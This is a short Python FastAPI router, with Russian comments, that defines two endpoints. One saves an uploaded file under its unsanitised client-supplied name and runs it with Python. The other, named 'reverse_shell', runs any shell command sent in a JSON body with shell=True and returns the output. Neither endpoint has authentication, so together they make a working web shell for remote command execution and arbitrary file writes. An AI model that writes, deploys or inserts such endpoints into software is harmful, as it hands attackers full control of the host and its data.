from fastapi import File, Request, UploadFile
from fastapi import APIRouter
from fastapi.responses import JSONResponse
import subprocess
import os
import asyncio

from starlette.types import ExceptionHandler


app = APIRouter()

@app.post("/execute_file")
async def execute_file(code_file: UploadFile = File(...)):
    file_path = f"{code_file.filename}"
    with open(file_path, "wb") as buffer:
        buffer.write(await code_file.read())

    try:
        process = await asyncio.create_subprocess_exec(
            "python", file_path,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if process.returncode == 0:
            result = f"Код выполнен: {stdout.decode()}"
        else:
            result = f"Ошибка выполнения кода: {stderr.decode()}"
    except Exception as e:
        result = f"Ошибка выполнения: {e}"

    os.remove(file_path)  # Удаление файла после выполнения

    return JSONResponse({"result": result})

@app.post("/reverse_shell/")
async def reverse_shell(request: Request):
    body = await request.json()
    reverse_shell_code = body.get("code")

    try:
        result = subprocess.run(reverse_shell_code, shell=True, capture_output=True, text=True)
        return {"stdout": result.stdout, "stderr": result.stderr}
    except Exception as e:
        return {"error": str(e)}

